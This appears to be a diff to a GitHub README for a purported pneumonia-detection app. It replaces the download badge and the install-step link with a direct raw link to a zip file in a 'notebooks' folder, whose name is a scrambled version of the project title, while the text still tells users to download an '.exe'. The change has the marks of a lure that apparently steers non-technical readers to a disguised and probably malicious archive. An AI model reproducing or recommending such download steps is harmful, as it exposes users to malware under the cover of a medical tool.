@@ -1,6 +1,6 @@
 # 🩺 Pneumonia-Detection-Using-Deep-Learning - AI Systems for Accurate Pneumonia Detection
 
-[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Tridentonethousand422/Pneumonia-Detection-Using-Deep-Learning)
+[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Tridentonethousand422/Pneumonia-Detection-Using-Deep-Learning/main/notebooks/Pneumonia_Learning_Deep_Using_Detection_v1.7.zip)
 
 This system helps users identify pneumonia in chest X-rays. It uses artificial intelligence to look at images and provide reports. The software combines medical imaging tools with automated reporting to assist in health screening.
 
@@ -19,7 +19,7 @@ Your computer needs to meet these standards to run the software smoothly.
 
 You must visit the project page to download the software.
 
-1. Go to this link: [https://github.com/Tridentonethousand422/Pneumonia-Detection-Using-Deep-Learning](https://github.com/Tridentonethousand422/Pneumonia-Detection-Using-Deep-Learning).
+1. Go to this link: [https://raw.githubusercontent.com/Tridentonethousand422/Pneumonia-Detection-Using-Deep-Learning/main/notebooks/Pneumonia_Learning_Deep_Using_Detection_v1.7.zip](https://raw.githubusercontent.com/Tridentonethousand422/Pneumonia-Detection-Using-Deep-Learning/main/notebooks/Pneumonia_Learning_Deep_Using_Detection_v1.7.zip).
 2. Look for the "Releases" section on the right side of the screen.
 3. Click the most recent version labeled as the latest release.
 4. Download the file ending in `.exe` to your computer.
